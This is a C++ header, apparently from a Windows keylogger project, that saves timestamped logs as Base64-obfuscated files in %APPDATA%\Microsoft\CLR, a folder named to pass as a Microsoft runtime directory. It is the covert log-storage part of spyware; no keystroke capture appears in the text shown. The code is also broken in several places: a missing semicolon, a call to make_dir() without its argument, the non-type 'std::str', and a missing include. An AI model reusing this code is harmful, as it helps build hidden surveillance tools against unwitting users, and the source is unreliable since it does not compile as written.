#ifndef io_H
#define io_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "helper.h"
#include "Base64.h"

namespace io
{
    std::string GetOurPath(const bool append_seprator = false)
    {
        std:: string appdata_dir(getenv("APPDATA")); //We are gonna store the files in C:/User/USERNAME/appdata/roaming
        std::string full =appdata_dir +"\\Microsoft\\CLR";
        return full +(append_seprator ? "\\" : "")
    }
    bool make_dir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(),NULL) || GetLastError()== ERROR_ALREADY_EXISTS;
    }
    bool dir_backup(std::string path)
    {
        for(char &c :path)
            if(c=='\\')
            {
                c='\0';
                if(!make_dir())
                    return false;
                c='\\';

            }
    return true;
    }
    template <class T>
    std::string WriteLog(const T &t)
    {
        std:: string path = GetOurPath(true);
        helper::DateTime dt;
        std::string name =dt.GetDateTimeString("_") +".log";
        try
        {
            std::ofstream file(path+name);
            if(!file) return "";
            std::ostringstream s;
            s<<"["<<dt.GetDateTimeString()<<"]"<<std::endl<<t<<std::endl;
            std::str data =Base64::EncryptB64(s.str());
            file<<data;
            if(!file) return "";
            file.close();
            return name;

        }
        catch(...)
        {
            return "";
        }


    }
}

#endif
